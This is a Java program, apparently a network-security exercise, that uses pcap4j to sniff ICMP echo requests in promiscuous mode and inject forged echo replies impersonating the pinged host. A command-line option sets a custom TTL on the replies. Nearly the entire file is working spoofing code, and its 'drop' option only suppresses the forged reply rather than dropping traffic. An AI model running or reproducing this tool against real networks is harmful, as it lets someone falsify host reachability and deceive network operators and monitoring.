import jnr.ffi.annotations.In;
import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import org.pcap4j.packet.namednumber.*;
import org.pcap4j.util.IpV4Helper;
import org.pcap4j.util.MacAddress;

import javax.sound.midi.SysexMessage;
import java.io.EOFException;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.concurrent.Callable;
import java.util.concurrent.TimeoutException;

public class ICMPPoison {

    public static void main(String[] args) {
        int packetsToCapture = 2;
        int modifiedTTL = 0;
        boolean dropPacket = false;

        switch (args.length){
            case 3:
                dropPacket = Boolean.parseBoolean(args[2]);
            case 2:
                modifiedTTL = Integer.parseInt(args[1]);
            case 1:
                packetsToCapture = Integer.parseInt(args[0]);
            case 0:
                break;
        }

        PcapNetworkInterface networkInterface;
        try {
            networkInterface = MacAddressResolver.getAvailableNetworkInterface();
        } catch (PcapNativeException e) {
            throw new RuntimeException(e);
        }

        poisonICMP(networkInterface, packetsToCapture, modifiedTTL, dropPacket);
    }
    
    public static void poisonICMP(PcapNetworkInterface networkInterface, int packetsToCapture, int modifiedTTL, boolean dropPacket) {

        int capturedICMPPackets = 0;

        if (networkInterface == null) {
            return;
        }

        PcapHandle handle;
        try {
            handle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
        } catch (PcapNativeException e) {
            throw new RuntimeException(e);
        }

        try {
            handle.setFilter("icmp", BpfProgram.BpfCompileMode.OPTIMIZE);
        } catch (PcapNativeException e) {
            throw new RuntimeException(e);
        } catch (NotOpenException e) {
            throw new RuntimeException(e);
        }

        while (capturedICMPPackets < packetsToCapture) {

            try {
                Packet packet = null;
                packet = handle.getNextPacketEx();

                if (packet.contains(IcmpV4EchoPacket.class)) {

                    IpV4Packet ipv4 = packet.get(IpV4Packet.class);
                    System.out.println("Captured ICMP Echo from: " + ipv4.getHeader().getSrcAddr());

                    if(dropPacket){
                        System.out.println("Reply dropped");
                        capturedICMPPackets++;
                        continue;
                    }

                    Packet fakeReply = buildFakeICMPReply(packet, modifiedTTL);

                    handle.sendPacket(fakeReply);

                    IpV4Packet ipv4Reply = fakeReply.get(IpV4Packet.class);

                    System.out.println("Poisoned IMCP Reply sent to: " + ipv4Reply.getHeader().getDstAddr());

                    capturedICMPPackets++;
                }
            } catch (NotOpenException e) {
                e.printStackTrace();
            } catch (EOFException e) {
                e.printStackTrace();
            } catch (PcapNativeException e) {
                e.printStackTrace();
            } catch (TimeoutException e) {
            }
        }
    }

    /**
     *
     * @param icmpEchoPacket
     * @param modifiedTTL 0 if no modification
     * @return
     */
    private static Packet buildFakeICMPReply(Packet icmpEchoPacket, int modifiedTTL) {

        EthernetPacket ethernetHeader = icmpEchoPacket.get(EthernetPacket.class);
        IpV4Packet ipV4Packet = icmpEchoPacket.get(IpV4Packet.class);
        IcmpV4EchoPacket icmpV4EchoPacket = icmpEchoPacket.get(IcmpV4EchoPacket.class);

        Inet4Address sourceIP = ipV4Packet.getHeader().getSrcAddr();
        Inet4Address destinationIP = ipV4Packet.getHeader().getDstAddr();

        MacAddress sourceMac = ethernetHeader.getHeader().getSrcAddr();
        MacAddress destinationMac = ethernetHeader.getHeader().getDstAddr();

        int identifier = icmpV4EchoPacket.getHeader().getIdentifier();
        int sequence = icmpV4EchoPacket.getHeader().getSequenceNumber();
        byte[] data = icmpV4EchoPacket.getPayload().getRawData();

        int ttl = 0;

        if(modifiedTTL == 0){
            ttl = ipV4Packet.getHeader().getTtlAsInt();
        } else {
            ttl = modifiedTTL;
        }

        ipV4Packet.getHeader().getTtlAsInt();

        return buildICMPReplyPacket(IcmpV4Type.ECHO_REPLY, destinationIP, sourceIP, destinationMac, sourceMac, identifier, sequence, data, ttl);
    }

    private static Packet buildICMPEchoPacket(IcmpV4Type icmpV4Type, Inet4Address sourceIP, Inet4Address destinationIP, MacAddress sourceMAC, MacAddress destinationMAC, int identifier, int sequence, byte[] data, int ttl) {

        UnknownPacket.Builder dataBuilder = new UnknownPacket.Builder();
        dataBuilder
                .rawData(data);

        IcmpV4EchoPacket.Builder icmpEchoBuilder = new IcmpV4EchoPacket.Builder();
        icmpEchoBuilder
                .identifier((short) identifier)
                .sequenceNumber((short) sequence)
                .payloadBuilder(dataBuilder);

        IcmpV4CommonPacket.Builder icmpPacketBuilder = new IcmpV4CommonPacket.Builder();
        icmpPacketBuilder
                .type(icmpV4Type)
                .code(IcmpV4Code.NO_CODE)
                .payloadBuilder(icmpEchoBuilder)
                .correctChecksumAtBuild(true);

        IpV4Packet.Builder ipPacketBuilder = new IpV4Packet.Builder();
        IpV4Packet.IpV4Tos ipV4Tos = new IpV4Packet.IpV4Tos() {
            @Override
            public byte value() {
                return 0;
            }
        };
        ipPacketBuilder
                .version(IpVersion.IPV4)
                .tos(ipV4Tos)
                .identification((short) 0)
                .ttl((byte) ttl)
                .protocol(IpNumber.ICMPV4)
                .srcAddr(sourceIP)
                .dstAddr(destinationIP)
                .payloadBuilder(icmpPacketBuilder)
                .correctChecksumAtBuild(true)
                .correctLengthAtBuild(true);

        EthernetPacket.Builder ethernetPacketBuilder = new EthernetPacket.Builder();
        ethernetPacketBuilder
                .srcAddr(sourceMAC)
                .dstAddr(destinationMAC)
                .type(EtherType.IPV4)
                .payloadBuilder(ipPacketBuilder)
                .paddingAtBuild(true);

        return ethernetPacketBuilder.build();
    }

    private static Packet buildICMPReplyPacket(IcmpV4Type icmpV4Type, Inet4Address sourceIP, Inet4Address destinationIP, MacAddress sourceMAC, MacAddress destinationMAC, int identifier, int sequence, byte[] data, int ttl) {

        UnknownPacket.Builder dataBuilder = new UnknownPacket.Builder();
        dataBuilder
                .rawData(data);

        IcmpV4EchoReplyPacket.Builder icmpEchoReplyBuilder = new IcmpV4EchoReplyPacket.Builder();
        icmpEchoReplyBuilder
                .identifier((short) identifier)
                .sequenceNumber((short) sequence)
                .payloadBuilder(dataBuilder);

        IcmpV4CommonPacket.Builder icmpPacketBuilder = new IcmpV4CommonPacket.Builder();
        icmpPacketBuilder
                .type(icmpV4Type)
                .code(IcmpV4Code.NO_CODE)
                .payloadBuilder(icmpEchoReplyBuilder)
                .correctChecksumAtBuild(true);

        IpV4Packet.Builder ipPacketBuilder = new IpV4Packet.Builder();
        IpV4Packet.IpV4Tos ipV4Tos = new IpV4Packet.IpV4Tos() {
            @Override
            public byte value() {
                return 0;
            }
        };
        ipPacketBuilder
                .version(IpVersion.IPV4)
                .tos(ipV4Tos)
                .identification((short) 0)
                .ttl((byte) ttl)
                .protocol(IpNumber.ICMPV4)
                .srcAddr(sourceIP)
                .dstAddr(destinationIP)
                .payloadBuilder(icmpPacketBuilder)
                .correctChecksumAtBuild(true)
                .correctLengthAtBuild(true);

        EthernetPacket.Builder ethernetPacketBuilder = new EthernetPacket.Builder();
        ethernetPacketBuilder
                .srcAddr(sourceMAC)
                .dstAddr(destinationMAC)
                .type(EtherType.IPV4)
                .payloadBuilder(ipPacketBuilder)
                .paddingAtBuild(true);

        return ethernetPacketBuilder.build();
    }
}
